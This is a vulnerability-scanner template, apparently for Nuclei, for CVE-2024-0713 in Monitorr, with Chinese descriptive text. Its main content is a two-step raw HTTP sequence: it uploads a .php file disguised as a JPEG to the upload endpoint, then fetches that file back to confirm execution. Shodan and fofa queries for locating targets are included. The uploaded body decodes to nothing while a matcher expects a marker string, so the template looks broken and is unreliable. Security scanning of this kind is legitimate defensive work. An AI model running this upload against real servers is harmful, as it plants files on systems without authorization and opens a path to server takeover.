id: monitorr-file-upload

info:
  name: Monitorr Services Configuration - 任意文件上传漏洞（CVE-2024-0713）
  author: DhiyaneshDK
  severity: high
  description: |
    该模板用于检测 Monitorr Services Configuration - 任意文件上传漏洞。该类漏洞通常源于上传接口缺少认证、文件类型校验、存储隔离或执行权限控制。模板会向 `/assets/php/upload.php`、`/assets/data/usrimg/{{file}}.php` 等位置发送探测请求，并结合响应状态、关键字、错误信息、时间差或外带交互等证据判断目标是否受影响。
  impact: |
    - 攻击者可能上传脚本、WebShell 或恶意文件，并借此执行代码或长期控制服务器。
    - 上传目录若可被访问或解析，可能导致数据篡改、恶意内容投递和业务系统被接管。
  remediation: |
    - 为上传接口增加认证授权和 CSRF 防护，限制可上传文件类型、大小和扩展名。
    - 在服务端校验文件内容与 MIME 类型，将上传文件存储到不可执行目录并使用随机文件名。
    - 清理异常上传文件，复核上传目录解析配置、访问日志和可疑账号活动。
  reference:
    - https://github.com/Tropinene/Yscanner
    - https://github.com/fkie-cad/nvd-json-data-feeds
    - https://nvd.nist.gov/vuln/detail/CVE-2024-0713
  classification:
    cvss-metrics: CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:H
    cvss-score: 8.8
    cwe-id: CWE-434
    epss-score: 0.00061
    epss-percentile: 0.2356
    cpe: cpe:2.3:a:monitorr:monitorr:1.7.6m:*:*:*:*:*:*:*
  metadata:
    verified: true
    max-request: 2
    vendor: monitorr
    product: monitorr
    shodan-query: http.favicon.hash:"-211006074"
    fofa-query: "icon_hash=\"-211006074\""
  tags: fileupload,intrusive,monitorr,vuln
variables:
  file: "{{to_lower(rand_text_alpha(5))}}"

flow: http(1) && http(2)

http:
  - raw:
      - |
        POST /assets/php/upload.php HTTP/1.1
        Host: {{Hostname}}
        Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryaquxwjsn

        ------WebKitFormBoundaryaquxwjsn
        Content-Disposition: form-data; name="fileToUpload"; filename="{{file}}.php"
        Content-Type: image/jpeg

        {{base64_decode('')}}
        ------WebKitFormBoundaryaquxwjsn--

    matchers:
      - type: word
        part: body
        internal: true
        words:
          - "has been uploaded to:"

  - raw:
      - |
        GET /assets/data/usrimg/{{file}}.php HTTP/1.1
        Host: {{Hostname}}

    matchers-condition: and
    matchers:
      - type: word
        part: body
        words:
          - "atfersotg"

      - type: status
        status:
          - 200
